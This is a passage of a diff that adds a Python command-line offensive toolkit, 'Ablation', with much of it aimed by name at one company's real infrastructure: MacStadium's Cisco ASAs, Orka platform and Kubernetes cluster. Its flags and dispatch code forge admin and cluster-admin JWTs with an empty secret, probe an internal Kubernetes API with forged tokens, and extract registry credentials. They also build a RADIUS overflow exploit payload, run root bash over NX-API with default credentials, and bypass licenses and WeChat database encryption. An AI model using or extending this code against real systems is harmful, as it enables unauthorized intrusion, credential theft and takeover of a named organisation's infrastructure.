+                for finding in sr.get('findings', [])[:10]:
+                    f.write(f"  {finding}\n")
+                f.write("\n")
+
+            # Java RE
+            jr = self.findings.get('java_re', {})
+            if jr and not jr.get('error') and jr.get('total_classes', 0) > 0:
+                f.write("JAVA/JVM ANALYSIS\n")
+                f.write("-"*60 + "\n")
+                f.write(f"Total classes: {jr.get('total_classes', 0)}\n")
+                f.write(f"Frameworks: {', '.join(jr.get('frameworks', []))}\n")
+                for dc in jr.get('dangerous_calls', [])[:5]:
+                    f.write(f"  [DANGEROUS] {dc.get('method', dc)}\n")
+                for sec in jr.get('config_secrets', [])[:5]:
+                    f.write(f"  [SECRET] {sec.get('key', '?')} in {sec.get('path', '?')}\n")
+                f.write("\n")
+
+            # Crypto audit
+            ca = self.findings.get('crypto_audit', {})
+            if ca and not ca.get('error'):
+                f.write("CRYPTOGRAPHIC AUDIT\n")
+                f.write("-"*60 + "\n")
+                for cf in ca.get('critical_findings', []):
+                    f.write(f"  [CRITICAL] {cf}\n")
+                for km in ca.get('key_material', [])[:5]:
+                    f.write(f"  [KEY] {km.get('type', '?')} at {km.get('path', '?')}\n")
+                jwt_list = ca.get('jwt_findings', [])
+                if jwt_list:
+                    f.write(f"  JWTs analyzed: {len(jwt_list)}\n")
+                f.write("\n")
+
+        return summary_path
+
+def main():
+    import argparse
+    
+    parser = argparse.ArgumentParser(description='Ablation - Autonomous Reverse Engineering')
+    parser.add_argument('--quick', action='store_true', help='Quick platform fingerprint only')
+    parser.add_argument('--process', type=int, metavar='PID', help='Analyze specific process')
+    parser.add_argument('--binary', metavar='FILE', help='Analyze specific binary')
+    parser.add_argument('--syscalls', type=int, metavar='PID', help='Trace syscalls for PID')
+    parser.add_argument('--duration', type=int, default=5, help='Syscall trace duration (seconds)')
+    parser.add_argument('--privesc', action='store_true', help='Enumerate privilege escalation paths')
+    parser.add_argument('--docker', action='store_true', help='Docker enumeration')
+    parser.add_argument('--k8s', action='store_true', help='Kubernetes enumeration')
+    parser.add_argument('--orka', action='store_true', help='Orka platform enumeration')
+    parser.add_argument('--containers', action='store_true', help='Full container/platform analysis')
+    parser.add_argument('--swift', metavar='BINARY', help='Swift binary RE analysis')
+    parser.add_argument('--java', metavar='PATH', help='Java class/JAR analysis')
+    parser.add_argument('--crypto', action='store_true', help='Cryptographic audit (JWTs, keys, TLS)')
+    parser.add_argument('--asa', action='store_true', help='Cisco ASA WebVPN enumeration')
+    parser.add_argument('--jwt', metavar='TOKEN', help='Analyze JWT token for weaknesses')
+    parser.add_argument('--nxos', action='store_true', help='Cisco NX-OS / ACI / APIC enumeration')
+    parser.add_argument('--asdm-re', metavar='HOST', help='Download + RE Cisco ASDM JAR from live ASA')
+    parser.add_argument('--webvpn-js', metavar='HOST', help='RE Cisco ASA WebVPN portal JavaScript')
+    parser.add_argument('--ios-re', metavar='FILE', help='RE Cisco IOS/IOS-XE firmware image')
+    parser.add_argument('--config-re', metavar='FILE', help='RE Cisco running-config for creds/topology')
+    parser.add_argument('--rommon-re', metavar='CONFREG', help='ROMMON bypass analysis (hex config-register, e.g. 0x2102)')
+    parser.add_argument('--cisco-api', metavar='HOST', help='Cisco API surface RE (RESTCONF/NETCONF/YANG)')
+    parser.add_argument('--guestshell', metavar='HOST', help='NX-OS guestshell RE and escape analysis')
+    parser.add_argument('--asdm-re-all', action='store_true', help='ASDM RE against all MacStadium ASAs')
+    parser.add_argument('--webvpn-js-all', action='store_true', help='WebVPN JS RE against all MacStadium ASAs')
+    parser.add_argument('--cstp', metavar='HOST', help='CSTP/HostScan/DAP attack surface RE')
+    parser.add_argument('--cstp-all', action='store_true', help='CSTP RE against all MacStadium ASAs')
+    parser.add_argument('--go-re', metavar='BINARY', help='Go binary static RE (module graph, endpoints, creds)')
+    parser.add_argument('--saml-sp', metavar='HOST', help='SAML SP injection RE against ASA WebVPN')
+    parser.add_argument('--saml-sp-all', action='store_true', help='SAML SP injection against all MacStadium ASAs')
+    parser.add_argument('--username-oracle', metavar='HOST', help='Username timing oracle via POST /+webvpn+/index.html')
+    parser.add_argument('--username-oracle-all', action='store_true', help='Username oracle against all MacStadium ASAs')
+    parser.add_argument('--tunnel-groups', metavar='HOST', help='Enumerate tunnel groups / connection profiles')
+    parser.add_argument('--tunnel-groups-all', action='store_true', help='Tunnel group enum against all MacStadium ASAs')
+    parser.add_argument('--radius-re', metavar='HOST', help='RADIUS class attr 25 attack surface RE')
+    parser.add_argument('--radius-re-all', action='store_true', help='RADIUS class attr RE against all MacStadium ASAs')
+    parser.add_argument('--crl-bypass', metavar='HOST', help='CRL/OCSP reachability + revocation bypass chain RE')
+    parser.add_argument('--crl-bypass-all', action='store_true', help='CRL bypass probe against all MacStadium ASAs')
+    parser.add_argument('--cert-map', metavar='HOST', help='Cert-to-tunnel-group mapping RE + bypass chain')
+    parser.add_argument('--cert-map-all', action='store_true', help='Cert map RE against all MacStadium ASAs')
+    parser.add_argument('--radius-coa', metavar='HOST', help='RADIUS CoA mid-session attribute injection RE')
+    parser.add_argument('--radius-coa-all', action='store_true', help='RADIUS CoA RE against all MacStadium ASAs')
+    parser.add_argument('--asa-version', metavar='HOST', help='ASA version fingerprint from TLS/CSTP/cert artifacts')
+    parser.add_argument('--asa-version-all', action='store_true', help='ASA version fingerprint against all MacStadium ASAs')
+    parser.add_argument('--orka-oidc', action='store_true', help='Orka3 OIDC flow RE + JWT forge (CVE-2020-26160, empty secret)')
+    parser.add_argument('--orka-jwt', action='store_true', help='Analyze + forge MacStadium JWT (HS256 empty-secret)')
+    parser.add_argument('--orka-binary-re', action='store_true', help='Print orka3 binary RE findings summary')
+    parser.add_argument('--orka-jwt-re', action='store_true', help='CVE-2020-26160 analysis + function addresses + .rodata secrets')
+    parser.add_argument('--nxapi-bash', metavar='HOST', help='NX-API type:bash root exec probe (book: NX-OS Programmability ch-nxapi-cli)')
+    parser.add_argument('--nxapi-bash-user', default='admin', help='NX-API username (default: admin)')
+    parser.add_argument('--nxapi-bash-pass', default='admin', help='NX-API password (default: admin)')
+    parser.add_argument('--netconf-patterns', action='store_true', help='Print NETCONF attack pattern templates (confirmed-commit, lock, DME)')
+    parser.add_argument('--saml-metadata', action='store_true', help='Print live MacStadium SAML SP metadata constants')
+    parser.add_argument('--forge-admin', action='store_true', help='Forge admin@macstadium.com JWT token')
+    parser.add_argument('--forge-masters', action='store_true', help='Forge system:masters JWT for K8s cluster-admin')
+    parser.add_argument('--orka-k8s', metavar='PATH', default='/api/v1/namespaces', help='Probe K8s API at 10.221.188.19:6443 with forged token')
+    parser.add_argument('--oidc-discovery', action='store_true', help='Probe idp.macstadium.com OIDC discovery paths')
+    # orka_api_surface_re flags
+    parser.add_argument('--orka-api-surface', action='store_true', help='Print full Orka3 API surface (binary RE)')
+    parser.add_argument('--orka-api-probe', action='store_true', help='Probe all Orka REST API routes with admin token')
+    # orka_vm_exec_re flags
+    parser.add_argument('--orka-vm-exec', action='store_true', help='Orka3 VM execution RE: confirmed K8s pod exec path (orka-vm container)')
+    parser.add_argument('--orka-sa-token', action='store_true', help='Create persistent K8s SA token (expirationSeconds: null)')
+    parser.add_argument('--orka-regcreds', action='store_true', help='Extract Docker registry credentials from Orka API')
+    parser.add_argument('--orka-virsh-chain', metavar='POD', help='Run virsh probe chain against orka-vm container in POD')
+    parser.add_argument('--orka-attack-chain', action='store_true', help='Full Orka attack chain: enum + exec + SA token + regcreds')
+    # cisco_ftd_re flags
+    parser.add_argument('--ftd-exploit', metavar='MODULE',
+        help='Run a specific FTD ablation exploit module (e.g. log4shell_fdm, neo4j_backup_exfil, devauth_hardcoded_creds). '
+             'Use --ftd-list to see all available modules.')
+    parser.add_argument('--ftd-exploit-args', nargs=argparse.REMAINDER, default=[],
+        help='Arguments to pass to the FTD exploit module (e.g. -- check)')
+    parser.add_argument('--ftd-list', action='store_true', help='List all available FTD exploit modules')
+    parser.add_argument('--ftd-re', action='store_true', help='Cisco FTD firmware RE: Snort/FMC/REST/lina attack surface')
+    parser.add_argument('--ftd-image', metavar='FILE', help='Path to FTD qcow2 image file')
+    parser.add_argument('--ftd-rootfs', metavar='DIR', help='Path to already-extracted FTD root filesystem')
+    parser.add_argument('--ftd-binary', metavar='FILE', help='Analyze a single FTD binary (snort, lina, sfmbservice, etc.)')
+    parser.add_argument('--ftd-fuzz', metavar='DIR', help='Generate Snort rule fuzzing corpus in DIR')
+    parser.add_argument('--ftd-fuzz-count', type=int, default=500, help='Number of fuzz rules to generate (default: 500)')
+    parser.add_argument('--snort-fuzz-atheris', action='store_true',
+        help='Coverage-guided Snort rule fuzzer via Atheris/libFuzzer (pip install atheris)')
+    parser.add_argument('--snort-bin', default='snort', help='Path to snort binary (default: snort)')
+    parser.add_argument('--snort-conf', default='/etc/snort/snort.conf', help='Snort config file for atheris harness')
+    parser.add_argument('--mcp-fuzz', action='store_true',
+        help='Grammar-guided MCP tool schema fuzzer via Atheris — targets prompt injection in .mcp.json tool descriptions (pip install atheris)')
+    parser.add_argument('--mcp-fuzz-dry-run', action='store_true',
+        help='Print one sample MCP manifest (no fuzzing) — verify grammar output without Atheris')
+    parser.add_argument('--func-db', default='~/.ablation/func_id.db',
+        help='Path to function identity DB (default ~/.ablation/func_id.db)')
+    parser.add_argument('--func-db-seed', action='store_true',
+        help='Seed function ID DB from all confirmed RE sources (lina, AnyConnect, ISE)')
+    parser.add_argument('--func-db-query', metavar='NAME',
+        help='Query function ID DB by name (use ROLE:xxx for role lookup)')
+    parser.add_argument('--func-db-summary', action='store_true',
+        help='Print function ID DB row counts')
+
+    # cisco_asa_lina_re flags
+    parser.add_argument('--lina-re', action='store_true', help='Cisco ASA lina ARM64 binary RE: AAA/RADIUS/TACACS+ attack surface')
+    parser.add_argument('--lina-binary', metavar='FILE', help='Path to extracted lina ELF for static analysis')
+    parser.add_argument('--radius-decrypt', nargs=3, metavar=('CIPHER_HEX','AUTH_HEX','SECRET'), help='Decrypt RADIUS User-Password: cipher_hex auth_hex shared_secret')
+    parser.add_argument('--f2-payload', action='store_true', help='Build F2 exploit payload: crafted RADIUS Access-Accept OU= overflow for 9.22.x')
+    parser.add_argument('--f2-secret', metavar='SECRET', default='', help='RADIUS shared secret for F2 payload HMAC (leave empty for placeholder)')
+    parser.add_argument('--f2-fn-ptr', metavar='ADDR', default='0x102c700', help='Function pointer for CALL *rax target (default: mgd_timer_stop = safe crash test)')
+    parser.add_argument('--f2-struct-a', metavar='ADDR', default='0x05523f68', help='Address of fake struct A in target memory (BSS default assumes ASLR=off)')
+
+    # cisco_asa_cred_audit flags
+    parser.add_argument('--asa-audit', metavar='CONFIG_FILE',
+        help='Offline audit of a Cisco ASA running-config for weak/default secrets')
+    parser.add_argument('--asa-creds', metavar='HOST',
+        help='Live default credential probe against ASA management interface (authorized targets only)')
+    parser.add_argument('--type7-decode', metavar='HASH',
+        help='Decode a Cisco Type 7 obfuscated password string')
+    parser.add_argument('--regress', metavar='FILE',
+        help='Run OLS regression analysis (CSV or Excel). Use with --regress-y, --regress-x')
+    parser.add_argument('--regress-demo', action='store_true',
+        help='Run regression demo with built-in advertising→sales dataset')
+    parser.add_argument('--regress-y', metavar='COL',
+        help='Dependent variable column name for --regress')
+    parser.add_argument('--regress-x', nargs='+', metavar='COL',
+        help='Independent variable column names (default: all except --regress-y)')
+    parser.add_argument('--regress-logistic', action='store_true',
+        help='Use logistic regression (binary Y) instead of OLS')
+    parser.add_argument('--regress-residuals', action='store_true',
+        help='Include residual output table in regression report')
+    parser.add_argument('--regress-descriptive', action='store_true',
+        help='Include descriptive statistics for all columns')
+    parser.add_argument('--regress-correlation', action='store_true',
+        help='Include Pearson correlation matrix')
+    parser.add_argument('--regress-confidence', type=float, default=0.95,
+        help='Confidence interval level (default: 0.95)')
+    parser.add_argument('--regress-output', metavar='FILE',
+        help='Write regression report to file (default: stdout)')
+    parser.add_argument('--regress-firmware', action='store_true',
+        help='Run firmware version struct-offset regression using confirmed LINA offsets')
+    parser.add_argument('--regress-symbolic', action='store_true',
+        help='Show PySR/REMaQE symbolic regression status and data collection progress')
+
+    parser.add_argument('--wechat', action='store_true', help='WeChat Android static RE: MMTLS protocol + DB key + Frida hooks')
+    parser.add_argument('--wechat-apk', metavar='FILE', help='Path to WeChat APK for analysis')
+    parser.add_argument('--wechat-libs', metavar='DIR', help='Path to extracted arm64-v8a native libs directory')
+    parser.add_argument('--wechat-db-key', nargs=2, metavar=('IMEI', 'UIN'), help='Compute WeChat DB decryption key from IMEI and UIN')
+    parser.add_argument('--wechat-frida', action='store_true', help='Generate Frida hook script for MMTLS key extraction')
+    parser.add_argument('--wechat-probe-build', action='store_true', help='Cross-compile wechat-probe (ARM64 ptrace watchpoint) for Android')
+    parser.add_argument('--wechat-probe-push', action='store_true', help='Build + adb-push wechat-probe to connected device')
+    parser.add_argument('--wechat-probe-watch', action='store_true', help='Set HW watchpoint on gILinkKey; block until write; print writer PC + hex dump')
+    parser.add_argument('--wechat-probe-dump', action='store_true', help='One-shot /proc/pid/mem dump of gILinkKey from running WeChat')
+
+    parser.add_argument('--axis', metavar='PATH', help='AXIS ACAP EAP RE: full survey of all packages in dir or single binary')
+    parser.add_argument('--axis-license', metavar='PATH', help='AXIS licensekey_verify bypass vectors for SipThirdPartyIntegration binary')
+    parser.add_argument('--axis-bodyworn', metavar='PATH', help='AXIS BodyWornLiveSelfHosted WebRTC/TURN/JWT attack surface')
+    parser.add_argument('--axis-frida', metavar='PATH', help='Print Frida license bypass script for AXIS ACAP binary')
+    parser.add_argument('--api-re', metavar='URL', help='API reverse engineering: full RE pipeline (discovery, injection, JWT, BOLA, GraphQL, mass-assignment)')
+    parser.add_argument('--api-re-depth', choices=['quick', 'normal', 'deep'], default='normal', help='api-re depth (default: normal)')
+    parser.add_argument('--api-re-focus', choices=['injection', 'schema', 'state', 'jwt', 'auth', 'bola'], help='api-re focus dimension')
+    parser.add_argument('--api-re-output', metavar='FILE', help='Write api-re JSON report to file')
+
+    parser.add_argument('--fujitsu', action='store_true', help='Fujitsu PRIMERGY/PRIMEQUEST iRMC firmware RE: print all 13 findings (F1-F13)')
+    parser.add_argument('--fujitsu-chain', action='store_true', help='Print Fujitsu critical exploit chain summary')
+    parser.add_argument('--fujitsu-json', action='store_true', help='Dump Fujitsu findings JSON to /tmp/fujitsu-irmc-re.json')
+
+    args = parser.parse_args()
+    
+    ablation = Ablation()
+    
+    if args.quick:
+        ablation.banner()
+        info = ablation.detect_platform()
+        print(ablation.platform.report())
+    
+    elif args.process:
+        ablation.banner()
+        report = ablation.analyze_process(args.process)
+        print(json.dumps(report, indent=2))
+    
+    elif args.binary:
+        ablation.banner()
+        info = ablation.analyze_binary(args.binary)
+        print(json.dumps(info, indent=2))
+    
+    elif args.syscalls:
+        ablation.banner()
+        print(f"[*] Tracing syscalls for PID {args.syscalls} ({args.duration}s)...")
+        tracer = SyscallTracer(args.syscalls)
+        stats = tracer.trace_process(args.duration)
+        print("\n" + tracer.report(stats))
+    
+    elif args.privesc:
+        ablation.banner()
+        print("[*] Enumerating privilege escalation paths...")
+        enum = PrivescEnumerator()
+        paths = enum.enumerate_all()
+        print(enum.report())
+    
+    elif args.docker:
+        ablation.banner()
+        print("[*] Enumerating Docker environment...")
+        docker_enum = DockerEnumerator()
+        docker_enum.enumerate_all()
+        print(docker_enum.report())
+    
+    elif args.k8s:
+        ablation.banner()
+        print("[*] Enumerating Kubernetes environment...")
+        k8s_enum = K8sEnumerator()
+        k8s_enum.enumerate_all()
+        print(k8s_enum.report())
+    
+    elif args.orka:
+        ablation.banner()
+        print("[*] Enumerating Orka platform...")
+        orka_enum = OrkaEnumerator()
+        orka_enum.enumerate_all()
+        print(orka_enum.report())
+    
+    elif args.swift:
+        ablation.banner()
+        if not HAS_SWIFT_RE:
+            print("[-] swift_re module not available")
+        else:
+            analyzer = SwiftREAnalyzer()
+            result = analyzer.analyze(args.swift)
+            print(json.dumps(result, indent=2))
+
+    elif args.java:
+        ablation.banner()
+        if not HAS_JAVA_RE:
+            print("[-] java_decompiler module not available")
+        else:
+            analyzer = JavaREAnalyzer(args.java)
+            result = analyzer.analyze()
+            print(json.dumps(result, indent=2))
+
+    elif args.crypto:
+        ablation.banner()
+        if not HAS_CRYPTO_AUDIT:
+            print("[-] jwt_crypto_analyzer module not available")
+        else:
+            auditor = JWTCryptoAnalyzer()
+            # Forge MacStadium admin tokens and print
+            for payload in MACSTADIUM_FORGE_PAYLOADS:
+                tok = forge_token(payload, secret=b'', alg='HS256')
+                print(f"[FORGE] {payload['sub']}: {tok}")
+            print(auditor.report())
+
+    elif args.jwt:
+        ablation.banner()
+        if not HAS_CRYPTO_AUDIT:
+            print("[-] jwt_crypto_analyzer module not available")
+        else:
+            auditor = JWTCryptoAnalyzer()
+            findings = auditor.analyze_token(args.jwt)
+            print(auditor.report())
+            print(json.dumps(findings, indent=2))
+
+    elif args.asa:
+        ablation.banner()
+        if not HAS_ASA_ENUM:
+            print("[-] asa_enum module not available")
+        else:
+            print("[*] Enumerating MacStadium Cisco ASA instances...")
+            results = enumerate_macstadium_asas()
+            print(json.dumps(results, indent=2, default=str))
+
+    elif args.nxos:
+        ablation.banner()
+        if not HAS_NXOS:
+            print("[-] nxos_enum module not available")
+        else:
+            print("[*] Enumerating Cisco NX-OS / ACI / APIC targets...")
+            result = ablation.enumerate_nxos()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'asdm_re', None):
+        ablation.banner()
+        if not HAS_ASDM_RE:
+            print("[-] cisco_asdm_download_re module not available")
+        else:
+            def _run_asdm(host, port=443):
+                dl = ASDMDownloader(host, port)
+                jnlp = dl.find_jnlp()
+                jars_downloaded = {}
+                if jnlp:
+                    print(f"  [+] JNLP found ({len(jnlp)} bytes)")
+                    jar_paths = dl.parse_jnlp(jnlp)
+                    print(f"  [+] JAR paths: {jar_paths}")
+                    for jar_path in jar_paths:
+                        data = dl.download_jar(jar_path)
+                        if data:
+                            jars_downloaded[jar_path] = data
+                else:
+                    print(f"  [-] No JNLP — trying direct JAR paths")
+                    for path in ['/admin/public/asdm.jar', '/asdm.jar', '/admin/public/asdm-launcher.jar']:
+                        data = dl.download_jar(path)
+                        if data:
+                            jars_downloaded[path] = data
+                            print(f"  [+] Direct JAR hit: {path} ({len(data)} bytes)")
+                for path, data in jars_downloaded.items():
+                    print(f"  [*] Analyzing JAR: {path}")
+                    analyzer = ASDMJARAnalyzer(data, jar_name=path)
+                    result = analyzer.analyze()
+                    print(json.dumps(result, indent=2, default=str))
+                if not jars_downloaded:
+                    print(f"  [-] No JARs retrieved — JNLP:{'found' if jnlp else 'none'}")
+            host = args.asdm_re
+            print(f"[*] ASDM Download + RE: {host}")
+            _run_asdm(host)
+
+    elif getattr(args, 'asdm_re_all', False):
+        ablation.banner()
+        if not HAS_ASDM_RE:
+            print("[-] cisco_asdm_download_re module not available")
+        else:
+            def _run_asdm_target(asa):
+                host, port = asa['host'], asa['port']
+                print(f"\n[*] ASDM RE: {asa['label']} ({host}:{port})")
+                dl = ASDMDownloader(host, port)
+                jnlp = dl.find_jnlp()
+                jars_downloaded = {}
+                if jnlp:
+                    print(f"  [+] JNLP found ({len(jnlp)} bytes)")
+                    jar_paths = dl.parse_jnlp(jnlp)
+                    for jar_path in jar_paths:
+                        data = dl.download_jar(jar_path)
+                        if data:
+                            jars_downloaded[jar_path] = data
+                else:
+                    for path in ['/admin/public/asdm.jar', '/asdm.jar', '/admin/public/asdm-launcher.jar']:
+                        data = dl.download_jar(path)
+                        if data:
+                            jars_downloaded[path] = data
+                            print(f"  [+] Direct JAR: {path} ({len(data)} bytes)")
+                for path, data in jars_downloaded.items():
+                    analyzer = ASDMJARAnalyzer(data, jar_name=path)
+                    result = analyzer.analyze()
+                    print(json.dumps(result, indent=2, default=str))
+                if not jars_downloaded:
+                    print(f"  [-] No JARs — JNLP:{'found' if jnlp else 'none'}")
+            for asa in MACSTADIUM_ASAS:
+                _run_asdm_target(asa)
+
+    elif getattr(args, 'webvpn_js', None):
+        ablation.banner()
+        if not HAS_WEBVPN_JS:
+            print("[-] cisco_webvpn_js_re module not available")
+        else:
+            host = args.webvpn_js
+            print(f"[*] WebVPN JS RE: {host}")
+            re_eng = WebVPNJSRE(host, 443)
+            result = re_eng.analyze()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'webvpn_js_all', False):
+        ablation.banner()
+        if not HAS_WEBVPN_JS:
+            print("[-] cisco_webvpn_js_re module not available")
+        else:
+            for asa in MACSTADIUM_ASAS:
+                print(f"\n[*] WebVPN JS RE: {asa['label']} ({asa['host']})")
+                re_eng = WebVPNJSRE(asa['host'], asa['port'])
+                result = re_eng.analyze()
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'ios_re', None):
+        ablation.banner()
+        if not HAS_IOS_RE:
+            print("[-] cisco_ios_re module not available")
+        else:
+            result = analyze_ios_firmware(args.ios_re)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'config_re', None):
+        ablation.banner()
+        if not HAS_CONFIG_RE:
+            print("[-] cisco_config_re module not available")
+        else:
+            with open(args.config_re) as f:
+                text = f.read()
+            re_eng = CiscoConfigRE(text)
+            result = re_eng.analyze_all()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'rommon_re', None):
+        ablation.banner()
+        if not HAS_ROMMON_RE:
+            print("[-] cisco_rommon_re module not available")
+        else:
+            confreg = int(args.rommon_re, 16) if args.rommon_re.startswith('0x') else int(args.rommon_re)
+            re_eng = ROMMONBypassRE()
+            result = re_eng.analyze_confreg(confreg)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'cisco_api', None):
+        ablation.banner()
+        if not HAS_CISCO_API:
+            print("[-] cisco_api_enum module not available")
+        else:
+            enum = CiscoAPIEnum(args.cisco_api)
+            result = enum.run()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'guestshell', None):
+        ablation.banner()
+        if not HAS_GUESTSHELL:
+            print("[-] cisco_nxos_guestshell_re module not available")
+        else:
+            re_eng = NXOSGuestshellRE(args.guestshell)
+            result = re_eng.analyze()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'cstp', None) or getattr(args, 'cstp_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'cstp_all', False) else [
+                {'host': args.cstp, 'port': 443, 'label': args.cstp}
+            ]
+            for t in targets:
+                print(f"\n[*] CSTP/HostScan/DAP RE: {t['label']} ({t['host']})")
+                result = analyze_asa_attack_surface(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'go_re', None):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available (GoBinaryRE lives there)")
+        else:
+            print(f"[*] Go binary RE: {args.go_re}")
+            result = analyze_go_binary(args.go_re)
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'saml_sp', None) or getattr(args, 'saml_sp_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'saml_sp_all', False) else [
+                {'host': args.saml_sp, 'port': 443, 'label': args.saml_sp}
+            ]
+            for t in targets:
+                print(f"\n[*] SAML SP injection RE: {t['label']} ({t['host']})")
+                result = analyze_saml_sp(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'username_oracle', None) or getattr(args, 'username_oracle_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'username_oracle_all', False) else [
+                {'host': args.username_oracle, 'port': 443, 'label': args.username_oracle}
+            ]
+            for t in targets:
+                print(f"\n[*] Username timing oracle: {t['label']} ({t['host']})")
+                result = analyze_username_oracle(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'tunnel_groups', None) or getattr(args, 'tunnel_groups_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'tunnel_groups_all', False) else [
+                {'host': args.tunnel_groups, 'port': 443, 'label': args.tunnel_groups}
+            ]
+            for t in targets:
+                print(f"\n[*] Tunnel group enum: {t['label']} ({t['host']})")
+                result = analyze_tunnel_groups(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'radius_re', None) or getattr(args, 'radius_re_all', False):
+        ablation.banner()
+        if not HAS_RADIUS_RE:
+            print("[-] cisco_radius_ise_re module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'radius_re_all', False) else [
+                {'host': args.radius_re, 'port': 1812, 'label': args.radius_re}
+            ]
+            for t in targets:
+                print(f"\n[*] RADIUS surface analysis: {t['label']} ({t['host']})")
+                result = analyze_radius_surface(t['host'], port=t['port'])
+                result['class_attr_format'] = CLASS_ATTR_FORMAT
+                result['group_policies']    = list(MACSTADIUM_GROUP_POLICIES.keys())
+                result['dap_radius_attrs']  = DAP_RADIUS_ATTRS
+                result['a0_codes']          = ASA_A0_CODES
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'crl_bypass', None) or getattr(args, 'crl_bypass_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'crl_bypass_all', False) else [
+                {'host': args.crl_bypass, 'port': 443, 'label': args.crl_bypass}
+            ]
+            for t in targets:
+                print(f"\n[*] CRL bypass RE: {t['label']} ({t['host']})")
+                result = analyze_crl_bypass(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'cert_map', None) or getattr(args, 'cert_map_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'cert_map_all', False) else [
+                {'host': args.cert_map, 'port': 443, 'label': args.cert_map}
+            ]
+            for t in targets:
+                print(f"\n[*] Cert-map tunnel-group RE: {t['label']} ({t['host']})")
+                result = analyze_cert_map(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'radius_coa', None) or getattr(args, 'radius_coa_all', False):
+        ablation.banner()
+        if not HAS_RADIUS_RE:
+            print("[-] cisco_radius_ise_re module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'radius_coa_all', False) else [
+                {'host': args.radius_coa, 'port': 3799, 'label': args.radius_coa}
+            ]
+            for t in targets:
+                print(f"\n[*] RADIUS COA probe: {t['label']} ({t['host']}:3799)")
+                result = analyze_radius_surface(t['host'], port=1812)
+                injector = RadiusClassInjector(shared_secret=b'')
+                coa_pkt = injector.build_disconnect_request(
+                    nas_ip=t['host'], session_id='0'
+                )
+                result['coa_pkt_hex']  = coa_pkt.get('packet_hex', '')
+                result['coa_pkt_len']  = coa_pkt.get('length', 0)
+                result['coa_pkt_detail'] = coa_pkt
+                result['inject_vector'] = {
+                    'attr': 25,
+                    'format': CLASS_ATTR_FORMAT,
+                    'target_policies': list(MACSTADIUM_GROUP_POLICIES.keys()),
+                    'msg_auth_required_for_integrity': True,
+                }
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'asa_version', None) or getattr(args, 'asa_version_all', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            targets = MACSTADIUM_ASAS if getattr(args, 'asa_version_all', False) else [
+                {'host': args.asa_version, 'port': 443, 'label': args.asa_version}
+            ]
+            for t in targets:
+                print(f"\n[*] ASA version fingerprint: {t['label']} ({t['host']})")
+                result = analyze_asa_version(t['host'], t['port'])
+                print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_oidc', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            print("[*] Orka3 OIDC RE + JWT attack suite...")
+            result = orka_oidc_run()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_jwt', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            result = orka_jwt_analysis()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_binary_re', False):
+        ablation.banner()
+        if not HAS_ORKA_OIDC:
+            print("[-] orka_oidc_re module not available")
+        else:
+            result = get_binary_re_findings()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_jwt_re', False):
+        ablation.banner()
+        if not HAS_CSTP:
+            print("[-] cisco_cstp_attack module not available")
+        else:
+            print("[*] orka3 JWT RE — CVE-2020-26160 + function addresses + .rodata secrets")
+            result = analyze_orka_jwt()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'nxapi_bash', False):
+        ablation.banner()
+        if not HAS_GUESTSHELL or NXAPIBashExec is None:
+            print("[-] cisco_nxos_guestshell_re module not available or NXAPIBashExec missing")
+        else:
+            host = args.nxapi_bash
+            user = getattr(args, 'nxapi_bash_user', 'admin')
+            pwd  = getattr(args, 'nxapi_bash_pass', 'admin')
+            print(f"[*] NX-API type:bash probe: {host} (user={user})")
+            executor = NXAPIBashExec(host, username=user, password=pwd)
+            result = executor.run()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'netconf_patterns', False):
+        ablation.banner()
